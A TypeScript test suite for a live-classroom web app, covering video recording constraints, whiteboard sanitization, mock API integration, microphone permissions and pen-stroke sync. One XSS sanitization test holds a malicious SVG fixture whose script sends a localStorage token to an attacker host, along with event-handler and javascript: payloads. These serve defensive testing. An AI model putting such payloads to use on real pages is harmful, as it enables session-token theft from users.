import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

import {
  RECORDER_CONFIG,
  PREFERRED_CODECS,
  getStrict720pMediaConstraints,
  selectSupportedMimeType,
  getRecorderOptions,
  computeRandomUploadJitterMs,
  renderIntroBrandingScene,
} from '../src/modules/live-classroom/hooks/useCompressedClassRecorder';

import {
  CurriculumClient,
  sanitizeWhiteboardPayloadForStorage,
  RelationalLessonContext,
} from '../src/modules/live-classroom/services/curriculumClient';

import * as ContentSyncMath from '../src/modules/live-classroom/utils/contentSyncMath';
import {
  requestBrowserMicrophonePermission,
  downsampleFloat32ToInt16,
  encodePcmInt16ToBase64,
  decodePcmToFloat32,
  VOICE_RELAY_SAMPLE_RATE,
} from '../src/modules/live-classroom/hooks/useLiveKitStage';
import {
  normalizeParticipantId,
  isCurrentStudentEntry,
  isCurrentCoHostEntry,
  prioritizeStudentsForCurrentUser,
  prioritizeInvitedTeachersForCurrentUser,
  StudentAttendanceSummary,
  InvitedTeacherEntry,
} from '../src/modules/live-classroom/components/TopModeNavbar';

describe('Phase 2 Unit & Integration Suite — 720p Recorder, Jitter, Multi-Topic Navigation & Rough Pad Removal', () => {
  describe('1. 720p Browser Hardware Encoder & Random Jitter Unit Tests', () => {
    it('enforces strict 1280x720 resolution and 15-20fps frameRate constraints', () => {
      const constraints = getStrict720pMediaConstraints();
      const video = constraints.video as MediaTrackConstraints;

      assert.deepEqual(video.width, { ideal: 1280, max: 1280 });
      assert.deepEqual(video.height, { ideal: 720, max: 720 });
      assert.deepEqual(video.frameRate, { ideal: 15, max: 20 });
    });

    it('cascades codec selection: vp9,opus -> avc1,mp4a -> vp8,opus -> video/webm', () => {
      // 1. Supports VP9 + Opus
      const mimeVp9 = selectSupportedMimeType((m) => m === 'video/webm;codecs=vp9,opus');
      assert.equal(mimeVp9, 'video/webm;codecs=vp9,opus');

      // 2. Fallback to H.264 + AAC (Safari / iOS)
      const mimeMp4 = selectSupportedMimeType((m) => m === 'video/mp4;codecs=avc1,mp4a');
      assert.equal(mimeMp4, 'video/mp4;codecs=avc1,mp4a');

      // 3. Fallback to VP8 + Opus
      const mimeVp8 = selectSupportedMimeType((m) => m === 'video/webm;codecs=vp8,opus');
      assert.equal(mimeVp8, 'video/webm;codecs=vp8,opus');

      // 4. Fallback to generic video/webm
      const mimeDefault = selectSupportedMimeType(() => false);
      assert.equal(mimeDefault, 'video/webm');
    });

    it('enforces 500 kbps video VBR and 48 kbps Opus audio bitrate caps', () => {
      const options = getRecorderOptions((m) => m === PREFERRED_CODECS[0]);
      assert.equal(options.mimeType, 'video/webm;codecs=vp9,opus');
      assert.equal(options.videoBitsPerSecond, 500_000);
      assert.equal(options.audioBitsPerSecond, 48_000);
      assert.equal(RECORDER_CONFIG.CHUNK_INTERVAL_MS, 10_000);
    });

    it('generates random chunk upload jitter strictly within [150ms, 1850ms] across 1,000 samples', () => {
      let minSeen = Infinity;
      let maxSeen = -Infinity;

      for (let i = 0; i < 1000; i++) {
        const jitter = computeRandomUploadJitterMs();
        assert.ok(
          jitter >= 150 && jitter <= 1850,
          `Jitter ${jitter}ms out of bounds [150, 1850]`
        );
        if (jitter < minSeen) minSeen = jitter;
        if (jitter > maxSeen) maxSeen = jitter;
      }

      // Deterministic boundary check
      assert.equal(computeRandomUploadJitterMs(150, 1850, () => 0), 150);
      assert.equal(computeRandomUploadJitterMs(150, 1850, () => 0.999999), 1850);
      assert.ok(maxSeen - minSeen > 1000, 'Jitter distribution spans wide range to prevent server spikes');
    });
  });

  describe('2. Strictly Two Stored Artifacts — Whiteboard Sanitization Unit Tests', () => {
    it('strips Content Mode pen/laser strokes and deleted Excalidraw elements before storage', () => {
      const dirtyPayload = {
        elements: [
          { id: 'el_rect_1', type: 'rectangle', x: 100, y: 120, isDeleted: false },
          { id: 'el_deleted_2', type: 'ellipse', x: 50, y: 50, isDeleted: true },
          { id: 'el_content_stroke', type: 'content_stroke', x: 10, y: 10 },
          { id: 'el_laser', type: 'laser_pointer', x: 20, y: 20 },
          { id: 'el_text_3', type: 'text', text: 'V = I * R', x: 200, y: 240 },
        ],
        appState: {
          viewBackgroundColor: '#ffffff',
          gridSize: 20,
          collaborators: new Map(),
        },
        files: { file_1: { id: 'file_1', mimeType: 'image/png' } },
        penStrokes: [{ id: 'stroke_1', points: [[1, 2]] }],
        contentStrokes: [{ id: 'stroke_2' }],
        laserPointer: { x: 100, y: 200, active: true },
      };

      const sanitized = sanitizeWhiteboardPayloadForStorage(dirtyPayload);

      assert.equal(sanitized.elements.length, 2);
      assert.deepEqual(
        sanitized.elements.map((e: any) => e.id),
        ['el_rect_1', 'el_text_3']
      );
      assert.equal((sanitized as any).penStrokes, undefined);
      assert.equal((sanitized as any).contentStrokes, undefined);
      assert.equal((sanitized as any).laserPointer, undefined);
      assert.equal(sanitized.appState.viewBackgroundColor, '#ffffff');
    });
  });

  describe('3. Student Rough Pad Removal & Light-Theme Multi-Topic UI Verification', () => {
    it('verifies Student Rough Pad tab & branch are removed from TopModeNavbar and LearningSessionLayout', () => {
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      // Rough Pad button & state branch must not exist
      assert.equal(navbarSource.includes('data-testid="mode-btn-roughpad"'), false);
      assert.equal(layoutSource.includes('key="student-rough-pad"'), false);
      assert.equal(layoutSource.includes("studentTab === 'roughpad'"), false);

      // New Phase 2 controls must be present
      assert.equal(navbarSource.includes('data-testid="teaching-mode-toggle-btn"'), true);
      assert.equal(navbarSource.includes('data-testid="recorder-status-pill"'), true);
    });
  });

  describe('4. End-to-End Frontend CurriculumClient <-> Mock Broadcast API Integration Test', () => {
    let mockServer: http.Server;
    let baseUrl: string;
    const receivedRequests: Array<{ method: string; url: string; headers: any; body: any }> = [];

    before(async () => {
      mockServer = http.createServer((req, res) => {
        const chunks: Buffer[] = [];
        req.on('data', (c) => chunks.push(c));
        req.on('end', () => {
          const rawBody = Buffer.concat(chunks);
          const contentType = req.headers['content-type'] || '';
          const parsedBody = contentType.includes('application/json')
            ? JSON.parse(rawBody.toString('utf8') || '{}')
            : rawBody;

          receivedRequests.push({
            method: req.method || 'GET',
            url: req.url || '/',
            headers: req.headers,
            body: parsedBody,
          });

          res.setHeader('Content-Type', 'application/json');

          if (req.url?.includes('/video-chunk')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                data: {
                  chunkIndex: Number(req.headers['x-chunk-index'] ?? 0),
                  bytesAppended: rawBody.length,
                },
              })
            );
            return;
          }

          if (req.url?.includes('/curriculum-navigate')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Segment logged',
                data: {
                  activeSegment: {
                    segmentIndex: receivedRequests.filter((r) =>
                      r.url.includes('/curriculum-navigate')
                    ).length,
                    chapterId: parsedBody.chapterId,
                    lessonId: parsedBody.lessonId,
                    topicId: parsedBody.topicId ?? null,
                    mode: parsedBody.mode,
                    startOffsetSec: parsedBody.videoOffsetSec,
                    endOffsetSec: null,
                    startedAtIso: new Date().toISOString(),
                    endedAtIso: null,
                  },
                  totalSegments: 2,
                  videoStorageKey:
                    'courses/course_12/board_2_lang_1/ch_10/lesson_101/v1_2026/video_720p.webm',
                },
              })
            );
            return;
          }

          if (req.url?.includes('/whiteboard-save')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Whiteboard saved',
                data: {
                  sessionId: 'sess_phase2_e2e',
                  lessonId: parsedBody.lessonId,
                  whiteboardStorageKey: `courses/course_12/board_2_lang_1/ch_${parsedBody.chapterId}/lesson_${parsedBody.lessonId}/v1_2026/whiteboard.json`,
                  compressedBytes: 256,
                  uncompressedBytes: 512,
                  elementsCount: parsedBody.elements?.length || 0,
                },
              })
            );
            return;
          }

          if (req.url?.includes('/finalize')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Session finalized',
                data: {
                  sessionId: 'sess_phase2_e2e',
                  totalDurationSec: parsedBody.totalDurationSec,
                },
              })
            );
            return;
          }

          res.writeHead(404);
          res.end(JSON.stringify({ message: 'Not found' }));
        });
      });

      await new Promise<void>((resolve) => {
        mockServer.listen(0, '127.0.0.1', () => {
          const addr = mockServer.address() as { port: number };
          baseUrl = `http://127.0.0.1:${addr.port}`;
          process.env.NEXT_PUBLIC_BROADCAST_API_URL = baseUrl;
          resolve();
        });
      });
    });

    after(async () => {
      await new Promise<void>((resolve) => mockServer.close(() => resolve()));
    });

    it('streams 720p chunks, navigates taught + reference_only lessons, saves sanitized whiteboard, and finalizes session', async () => {
      const sessionId = 'sess_phase2_e2e';
      const relContext: RelationalLessonContext = {
        sessionId,
        contextType: 'course_lesson',
        branchId: 4,
        batchId: 105,
        boardId: 2,
        languageId: 1,
        courseId: 12,
        linkedVodCourseId: 212,
        subjectId: 1,
        chapterId: 10,
        chapterNumber: 1,
        chapterTitle: 'Electrostatics',
        lessonId: 101,
        lessonNumber: '1.1',
        lessonTitle: 'Coulomb Law',
        topicId: 1001,
        teacherId: 501,
        academicYear: 2026,
        version: 1,
        publishToVodCourse: true,
        isPrimaryVod: true,
      };

      // 1. Upload Chunk #0 and Chunk #1
      const chunk0 = new Uint8Array([0x1a, 0x45, 0xdf, 0xa3, 0x11, 0x22]);
      const res0 = await CurriculumClient.uploadVideoChunk(sessionId, chunk0, {
        chunkIndex: 0,
        mimeType: 'video/webm;codecs=vp9,opus',
        relationalContext: relContext,
      });
      assert.equal(res0.success, true);
      assert.equal(res0.data.chunkIndex, 0);

      // 2. Teacher opens Lesson 99 in 'reference_only' mode at 300s (protects old VOD & WB)
      const navRefRes = await CurriculumClient.navigateCurriculum(sessionId, {
        chapterId: 9,
        lessonId: 99,
        topicId: 901,
        videoOffsetSec: 300,
        mode: 'reference_only',
        relationalContext: { ...relContext, lessonId: 99, publishToVodCourse: false },
      });
      assert.equal(navRefRes.success, true);
      assert.equal(navRefRes.data.activeSegment.mode, 'reference_only');
      assert.equal(navRefRes.data.activeSegment.startOffsetSec, 300);

      // 3. Teacher switches to Lesson 102 in 'taught' mode at 450s
      const navTaughtRes = await CurriculumClient.navigateCurriculum(sessionId, {
        chapterId: 10,
        lessonId: 102,
        topicId: 1002,
        videoOffsetSec: 450,
        mode: 'taught',
        relationalContext: { ...relContext, lessonId: 102, publishToVodCourse: true },
      });
      assert.equal(navTaughtRes.success, true);
      assert.equal(navTaughtRes.data.activeSegment.mode, 'taught');

      // 4. Save Whiteboard for taught lesson (verifying content_stroke is stripped)
      const wbRes = await CurriculumClient.saveWhiteboard(sessionId, {
        chapterId: 10,
        lessonId: 102,
        topicId: 1002,
        elements: [
          { id: 'wb_1', type: 'rectangle', x: 10, y: 20 },
          { id: 'bad_stroke', type: 'content_stroke', x: 0, y: 0 },
        ],
        relationalContext: relContext,
      });
      assert.equal(wbRes.success, true);
      assert.equal(wbRes.data.elementsCount, 1);

      // 5. Finalize Session on End Class
      const finRes = await CurriculumClient.finalizeSession(sessionId, {
        totalDurationSec: 900,
        relationalContext: relContext,
        whiteboard: {
          elements: [{ id: 'wb_final', type: 'arrow', x: 50, y: 60 }],
        },
      });
      assert.equal(finRes.success, true);
      assert.equal(finRes.data.totalDurationSec, 900);
    });
  });

  describe('5. P2-1: Stored XSS Sanitization for svgDiagram Before dangerouslySetInnerHTML', () => {
    it('strips <script>, <foreignObject>, inline on* event handlers, and javascript: URIs from svgDiagram while preserving valid SVG elements', () => {
      const sanitizeSvgMarkup = (ContentSyncMath as any).sanitizeSvgMarkup;
      assert.equal(
        typeof sanitizeSvgMarkup,
        'function',
        'sanitizeSvgMarkup must be exported from contentSyncMath.ts'
      );

      const maliciousSvg = `
        <svg viewBox="0 0 200 100" onload="alert('xss')" xmlns="http://www.w3.org/2000/svg">
          <script>fetch('https://attacker.tld/steal?t=' + localStorage.getItem('token'))</script>
          <foreignObject width="100" height="50">
            <iframe src="javascript:alert(1)"></iframe>
          </foreignObject>
          <a href="javascript:alert(2)" xlink:href="javascript:alert(3)">
            <circle cx="50" cy="50" r="40" stroke="#2563eb" fill="none" onerror="alert(4)" onclick="evil()" />
          </a>
          <path d="M 10 10 L 90 90" stroke="#1e293b" stroke-width="2" />
        </svg>
      `;

      const cleanSvg = sanitizeSvgMarkup(maliciousSvg);
      assert.equal(/<script/i.test(cleanSvg), false, '<script> tags must be stripped');
      assert.equal(/<foreignObject/i.test(cleanSvg), false, '<foreignObject> tags must be stripped');
      assert.equal(/\bon\w+\s*=/i.test(cleanSvg), false, 'Inline on* event handlers must be stripped');
      assert.equal(/javascript\s*:/i.test(cleanSvg), false, 'javascript: URIs must be neutralized');
      assert.equal(cleanSvg.includes('<circle'), true, 'Valid <circle> SVG element must be preserved');
      assert.equal(cleanSvg.includes('<path'), true, 'Valid <path> SVG element must be preserved');

      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      assert.equal(
        stageSource.includes('sanitizeSvgMarkup(block.svgDiagram)'),
        true,
        'VirtualContentStage.tsx must wrap block.svgDiagram with sanitizeSvgMarkup() before dangerouslySetInnerHTML'
      );
    });
  });

  describe('6. P2-4: Classroom JWT Stored in sessionStorage Instead of /rejoin URL Query String', () => {
    it('stores classroom JWT in sessionStorage(broadcast_rejoin_token) instead of leaking ?token= in /rejoin URLs', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const rejoinSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/RejoinScreen.tsx'),
        'utf8'
      );

      assert.equal(
        layoutSource.includes("sessionStorage.setItem('broadcast_rejoin_token'"),
        true,
        'LearningSessionLayout.tsx must persist token in sessionStorage before redirecting to /rejoin'
      );
      assert.equal(
        layoutSource.includes('...(token ? { token } : {})'),
        false,
        'LearningSessionLayout.tsx must not append raw token to /rejoin URL query parameters'
      );
      assert.equal(
        rejoinSource.includes("sessionStorage.getItem('broadcast_rejoin_token')"),
        true,
        'RejoinScreen.tsx must read broadcast_rejoin_token from sessionStorage'
      );
      assert.equal(
        rejoinSource.includes('...(token ? { token } : {})'),
        false,
        'RejoinScreen.tsx must not append raw token to / URL query parameters on rejoin'
      );
    });
  });

  describe('7. Goal Deliverables: Comic Sans Default Font, No Student Clear Button, Screen Wake Lock & Cross-Browser Support', () => {
    it('enforces Comic Sans (fontFamily: 5) as default whiteboard font and hides Clear button from students', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ExcalidrawStage.tsx'),
        'utf8'
      );
      const globalsCss = fs.readFileSync(
        path.resolve(__dirname, '../src/app/globals.css'),
        'utf8'
      );

      // 1. Default whiteboard font is 5 (Comic Sans / ComicShanns)
      assert.equal(
        stageSource.includes('export const DEFAULT_WHITEBOARD_FONT_FAMILY = 5'),
        true,
        'ExcalidrawStage.tsx must export DEFAULT_WHITEBOARD_FONT_FAMILY = 5 (Comic Sans)'
      );
      assert.equal(
        stageSource.includes('currentItemFontFamily: DEFAULT_WHITEBOARD_FONT_FAMILY'),
        true,
        'ExcalidrawStage initialData and scene updates must use DEFAULT_WHITEBOARD_FONT_FAMILY'
      );
      assert.equal(
        globalsCss.includes('Comic Sans MS'),
        true,
        'globals.css must include Comic Sans MS font stack for whiteboard rendering'
      );

      // 2. Clear button is restricted strictly to teacher (never shown to student on live classroom whiteboard)
      assert.equal(
        stageSource.includes("const canClearWhiteboard = isEditable && (role === 'teacher' || isRoughPad)"),
        true,
        'ExcalidrawStage.tsx must restrict Clear button to canClearWhiteboard (never shown to students on live whiteboard)'
      );
    });

    it('provides useScreenWakeLock hook and integrates it into LearningSessionLayout to prevent phone screen auto-off', () => {
      const wakeLockPath = path.resolve(
        __dirname,
        '../src/modules/live-classroom/hooks/useScreenWakeLock.ts'
      );
      assert.equal(
        fs.existsSync(wakeLockPath),
        true,
        'useScreenWakeLock.ts hook must exist'
      );

      const wakeLockSource = fs.readFileSync(wakeLockPath, 'utf8');
      assert.equal(
        wakeLockSource.includes("wakeLock.request('screen')"),
        true,
        'useScreenWakeLock must request W3C Screen Wake Lock API'
      );
      assert.equal(
        wakeLockSource.includes('visibilitychange'),
        true,
        'useScreenWakeLock must re-acquire wake lock on visibilitychange'
      );

      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      assert.equal(
        layoutSource.includes('useScreenWakeLock('),
        true,
        'LearningSessionLayout.tsx must activate useScreenWakeLock during live sessions'
      );
    });

    it('supports Chrome, Safari, Firefox, and Edge across MediaRecorder codecs, Fullscreen APIs, and Multi-Device Controls', () => {
      // 1. Safari generic video/mp4 fallback in PREFERRED_CODECS
      assert.equal(
        PREFERRED_CODECS.includes('video/mp4'),
        true,
        'PREFERRED_CODECS must include generic video/mp4 for Safari compatibility'
      );

      // 2. Fullscreen hook supports webkit, moz, and ms vendor prefixes
      const fsSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useFullscreenWorkspace.ts'),
        'utf8'
      );
      assert.equal(
        fsSource.includes('mozRequestFullScreen') && fsSource.includes('webkitRequestFullscreen'),
        true,
        'useFullscreenWorkspace.ts must support Safari webkit and Firefox moz prefixes'
      );

      // 3. TopModeNavbar includes Host Teacher per-student multi-device toggle
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      assert.equal(
        navbarSource.includes('multi-device-btn-'),
        true,
        'TopModeNavbar.tsx must render per-student multi-device toggle for the Host Teacher'
      );
    });

    it('synchronizes Whiteboard and Content scroll, camera, laser, and cursor bidirectionally across Host, Co-Host, and Students with board access', () => {
      const wbStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ExcalidrawStage.tsx'),
        'utf8'
      );
      const contentStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      // 1. ExcalidrawStage syncs incoming remote camera for all roles (not gated by role === 'student') and prevents self-echo via authorId + suppressRemoteCameraEchoUntilRef
      assert.equal(
        wbStageSource.includes('currentUserId && camera.authorId && camera.authorId === currentUserId') &&
          wbStageSource.includes('if (isEditable && isOwnCamera) return;'),
        true,
        'ExcalidrawStage must ignore self-authored camera updates while syncing remote camera updates to Host, Co-Host, and Students'
      );
      assert.equal(
        wbStageSource.includes('suppressRemoteCameraEchoUntilRef'),
        true,
        'ExcalidrawStage must suppress programmatic camera echoes when applying remote camera updates'
      );
      assert.equal(
        wbStageSource.includes('if (!effectiveIsHostTeacher || !isEditable || isRoughPad || !apiReady) return;'),
        true,
        'ExcalidrawStage must only broadcast initial camera on mount from the Host Teacher so joining Co-Hosts do not reset camera to (0,0)'
      );

      // 2. VirtualContentStage syncs incoming scroll and laser for all roles (Host, Co-Host, Student) and prevents programmatic scroll echo
      assert.equal(
        contentStageSource.includes('contentState.scrollAnchor.authorId === currentUserId') &&
          contentStageSource.includes('if (!followTeacher || (canAnnotate && isOwnScroll)) return;'),
        true,
        'VirtualContentStage must ignore self-authored scroll anchors while syncing remote scroll updates to Host, Co-Host, and Students'
      );
      assert.equal(
        contentStageSource.includes('if (isProgrammaticScrollRef.current) return;'),
        true,
        'VirtualContentStage handleScroll must not echo programmatic scroll updates back over the socket'
      );
      assert.equal(
        contentStageSource.includes('const isRemoteLaser =') &&
          contentStageSource.includes('laserPointer.authorId !== currentUserId'),
        true,
        'VirtualContentStage must render remote laser pointer and live cursor for all participants (Host, Co-Host, and Students)'
      );
    });
  });

  describe('8. Real-Time Microphone Permission Check & Hybrid LiveKit + Port-443 Voice Relay', () => {
    it('requests real-time browser microphone permission and stops temporary stream tracks when granted', async () => {
      let stoppedCount = 0;
      const originalNavigator = (globalThis as any).navigator;
      try {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: {
            mediaDevices: {
              getUserMedia: async () => ({
                getTracks: () => [
                  {
                    stop: () => {
                      stoppedCount += 1;
                    },
                  },
                ],
              }),
            },
          },
        });

        const res = await requestBrowserMicrophonePermission();
        assert.equal(res.granted, true);
        assert.equal(res.errorCode, undefined);
        assert.equal(stoppedCount, 1, 'Temporary permission check tracks must be stopped immediately');
      } finally {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: originalNavigator,
        });
      }
    });

    it('returns actionable PERMISSION_DENIED and NO_DEVICE errors when browser microphone access fails', async () => {
      const originalNavigator = (globalThis as any).navigator;
      try {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: {
            mediaDevices: {
              getUserMedia: async () => {
                const err = new Error('Permission denied by user');
                err.name = 'NotAllowedError';
                throw err;
              },
            },
          },
        });

        const deniedRes = await requestBrowserMicrophonePermission();
        assert.equal(deniedRes.granted, false);
        assert.equal(deniedRes.errorCode, 'PERMISSION_DENIED');
        assert.ok(deniedRes.error?.includes('Microphone permission'));

        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: {
            mediaDevices: {
              getUserMedia: async () => {
                const err = new Error('Requested device not found');
                err.name = 'NotFoundError';
                throw err;
              },
            },
          },
        });

        const noDeviceRes = await requestBrowserMicrophonePermission();
        assert.equal(noDeviceRes.granted, false);
        assert.equal(noDeviceRes.errorCode, 'NO_DEVICE');
      } finally {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: originalNavigator,
        });
      }
    });

    it('accurately downsamples, encodes, and decodes 16kHz PCM voice frames for the Port-443 voice relay', () => {
      assert.equal(VOICE_RELAY_SAMPLE_RATE, 16000);
      const input48k = new Float32Array(480);
      for (let i = 0; i < input48k.length; i++) {
        input48k[i] = Math.sin((2 * Math.PI * i) / 48) * 0.5;
      }

      const { pcmInt16, rms } = downsampleFloat32ToInt16(input48k, 48000, VOICE_RELAY_SAMPLE_RATE);
      assert.equal(pcmInt16.length, 160);
      assert.ok(rms > 0.2 && rms < 0.5, 'RMS level must be computed accurately');

      const b64 = encodePcmInt16ToBase64(pcmInt16);
      assert.ok(typeof b64 === 'string' && b64.length > 0);

      const decoded = decodePcmToFloat32(b64);
      assert.ok(decoded, 'Decoded Float32Array must not be null');
      assert.equal(decoded!.length, 160);
      assert.ok(Math.abs(decoded![12] - input48k[36]) < 0.01, 'Decoded PCM sample must match input waveform');
    });

    it('enforces real-time mic permission before Student raiseHand (so Host/Co-Host only see permitted students) and before Host/Co-Host/Student unmute', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      assert.equal(
        layoutSource.includes('const handleStudentRaiseHand = useCallback(async () => {') &&
          layoutSource.includes('const perm = await ensureMicrophonePermission();') &&
          layoutSource.includes('if (!perm.granted) {\n      return;\n    }\n    raiseHand();'),
        true,
        'LearningSessionLayout must verify browser microphone permission in handleStudentRaiseHand before calling raiseHand()'
      );

      assert.equal(
        layoutSource.includes('data-testid="mic-permission-alert-banner"') &&
          layoutSource.includes('data-testid="audio-autoplay-unlock-banner"'),
        true,
        'LearningSessionLayout must render mic permission alert banner and audio autoplay unlock banner'
      );
    });
  });

  // =========================================================================
  // 9. Cross-Device Pen Marking Sync, Word Highlight Commented Out & Steady Scroll Sync
  // =========================================================================
  describe('9. Cross-Device Pen Marking Sync, Word Highlight Commented Out & Steady Scroll Sync', () => {
    it('binds underlines drawn below Line 1 and in inter-word spaces to Line 1 tokens instead of snapping to Line 2 tokens below', async () => {
      const { hitTestWordToken } = await import(
        '../src/modules/live-classroom/utils/contentSyncMath'
      );

      // Simulate a paragraph where Line 1 is at y=40..61 (height=21) and Line 2 is at y=68..89 (7px gap)
      const tokenList = [
        { tokenId: 'b1:text:0', left: 20, top: 40, width: 65, height: 21 },
        { tokenId: 'b1:text:1', left: 93, top: 40, width: 55, height: 21 },
        // Line 2 directly underneath the space between b1:text:0 and b1:text:1
        { tokenId: 'b1:text:10', left: 60, top: 68, width: 70, height: 21 },
      ];
      const cache = {
        blockId: 'b1',
        blockRect: { left: 0, top: 0, width: 760, height: 220 } as DOMRect,
        tokens: new Map(tokenList.map((t) => [t.tokenId, t])),
        tokenList,
        regions: new Map(),
      };

      // Drawing an underline 5px below Line 1 (py = 66) in the inter-word space (px = 88)
      // Previously, symmetric vertical distance made py=66 closer to Line 2 (68-66=2px) than Line 1 (66-61=5px).
      // With asymmetric line-aware vertical hit-testing, py=66 is inside Line 1's underline zone [41.5, 67] and above Line 2's top (68+1.5=69.5).
      const hit = hitTestWordToken(88, 66, cache);
      assert.ok(hit, 'Underline in inter-word space 5px below Line 1 must hit a token');
      assert.ok(
        hit!.token.tokenId === 'b1:text:0' || hit!.token.tokenId === 'b1:text:1',
        `Expected Line 1 token (b1:text:0 or b1:text:1), got ${hit!.token.tokenId}`
      );
    });

    it('projects Laptop Pen strokes onto exact wrapped Mobile words and breaks wrapped lines cleanly with M', async () => {
      const {
        projectPointToDevicePixels,
        buildResponsiveSvgPath,
      } = await import('../src/modules/live-classroom/utils/contentSyncMath');

      // Laptop layout (760px wide): 4 words on a single line (y=40, height=20)
      const laptopTokenList = [
        { tokenId: 'b1:text:0', left: 24, top: 40, width: 80, height: 20 },
        { tokenId: 'b1:text:1', left: 112, top: 40, width: 90, height: 20 },
        { tokenId: 'b1:text:2', left: 210, top: 40, width: 85, height: 20 },
        { tokenId: 'b1:text:3', left: 303, top: 40, width: 95, height: 20 },
      ];
      const laptopLayout = {
        blockId: 'b1',
        blockRect: { left: 0, top: 0, width: 760, height: 220 } as DOMRect,
        tokens: new Map(laptopTokenList.map((t) => [t.tokenId, t])),
        tokenList: laptopTokenList,
        regions: new Map(),
      };

      // Mobile layout (350px wide): b1:text:0 and b1:text:1 on Line 1 (y=36), b1:text:2 and b1:text:3 wrapped to Line 2 (y=64)
      const mobileTokenList = [
        { tokenId: 'b1:text:0', left: 16, top: 36, width: 74, height: 19 },
        { tokenId: 'b1:text:1', left: 98, top: 36, width: 82, height: 19 },
        { tokenId: 'b1:text:2', left: 16, top: 64, width: 78, height: 19 },
        { tokenId: 'b1:text:3', left: 102, top: 64, width: 88, height: 19 },
      ];
      const mobileLayout = {
        blockId: 'b1',
        blockRect: { left: 0, top: 0, width: 350, height: 410 } as DOMRect,
        tokens: new Map(mobileTokenList.map((t) => [t.tokenId, t])),
        tokenList: mobileTokenList,
        regions: new Map(),
      };

      // Pen stroke drawn across b1:text:0 -> b1:text:3 on Laptop at ry = 1.05 (just below text)
      const strokePoints = [
        { x: 3.5, y: 27.7, tokenId: 'b1:text:0', rx: 0.05, ry: 1.05 },
        { x: 18.0, y: 27.7, tokenId: 'b1:text:1', rx: 0.3, ry: 1.05 },
        { x: 31.0, y: 27.7, tokenId: 'b1:text:2', rx: 0.3, ry: 1.05 },
        { x: 51.0, y: 27.7, tokenId: 'b1:text:3', rx: 0.95, ry: 1.05 },
      ];

      // 1. Verify Pen stroke point projects to Mobile's wrapped token coordinates (NOT raw block percentage)
      const projectedW2OnMobile = projectPointToDevicePixels(strokePoints[2], mobileLayout, true);
      // b1:text:2 on mobile: left=16 + 0.3*78 = 39.4, top=64 + 1.05*19 = 83.95
      assert.ok(
        Math.abs(projectedW2OnMobile.px - 39.4) < 1 && Math.abs(projectedW2OnMobile.py - 83.95) < 1,
        `Pen stroke must anchor to Mobile token b1:text:2 (got px=${projectedW2OnMobile.px}, py=${projectedW2OnMobile.py})`
      );

      // 2. Verify buildResponsiveSvgPath on Laptop stays a single continuous subpath (1 'M')
      const laptopPath = buildResponsiveSvgPath(strokePoints, laptopLayout, true);
      const laptopMoveCount = (laptopPath.match(/M /g) || []).length;
      assert.equal(laptopMoveCount, 1, `Laptop single-line stroke should have 1 M command, got: ${laptopPath}`);

      // 3. Verify buildResponsiveSvgPath on Mobile breaks into 2 horizontal subpaths across the wrapped line (2 'M' commands)
      const mobilePath = buildResponsiveSvgPath(strokePoints, mobileLayout, true);
      const mobileMoveCount = (mobilePath.match(/M /g) || []).length;
      assert.equal(
        mobileMoveCount,
        2,
        `Mobile wrapped-line stroke must split cleanly into 2 M subpaths without diagonal slash, got: ${mobilePath}`
      );
    });

    it('comments out automatic word highlighting with underline and keeps steady scroll sync without jumping visible sections to top', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      // Verify word highlighting with underline is commented out in renderTokenizedText
      assert.equal(
        stageSource.includes('Word highlighting with underline commented out as of now — using Pen SVG marking only'),
        true,
        'VirtualContentStage must have automatic word highlighting/underline commented out as requested'
      );

      // Verify pointer/pen auto-scroll does NOT jump a section to the top when already visible
      assert.equal(
        stageSource.includes('if (pointYInViewport >= edgeMargin && pointYInViewport <= viewportHeight - edgeMargin) {'),
        true,
        'VirtualContentStage must not scroll or jump a section to top when the marked/laser point is already visible in the viewport'
      );
    });
  });

  describe('10. Users Drawer Top-Priority Ordering & "You" Badge for Student, Host & Co-Host', () => {
    it('normalizes participant IDs across student_ and teacher_ prefixes', () => {
      assert.equal(normalizeParticipantId('student_101'), '101');
      assert.equal(normalizeParticipantId('101'), '101');
      assert.equal(normalizeParticipantId('teacher_cohost_abc'), 'cohost_abc');
      assert.equal(normalizeParticipantId('  Student_42  '), '42');
      assert.equal(normalizeParticipantId(null), '');
